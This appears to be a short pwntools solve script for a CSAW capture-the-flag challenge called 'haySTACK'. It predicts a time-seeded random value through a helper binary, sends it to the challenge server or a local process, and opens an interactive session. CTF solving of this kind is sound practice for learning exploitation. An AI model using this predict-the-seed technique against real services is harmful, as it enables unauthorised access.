# -- coding: utf-8 --
from pwn import *
import subprocess
import random
from time import time

# ENV
PORT = 5002
HOST = "pwn.chal.csaw.io"
e = context.binary = ELF('./haySTACK')
# lib = ELF('')
lib = e.libc
if len(sys.argv) > 1 and sys.argv[1] == 'r':
    r = remote(HOST, PORT)
else:
    r = e.process()


# VARIABLE
seed = int(time())
process = subprocess.Popen(['./a.out', str(seed + 2)], stdout=subprocess.PIPE)

# PAYLOAD
payload  = ''

rd = process.stdout.readline().rstrip()
print rd
r.sendline(rd)



r.interactive()
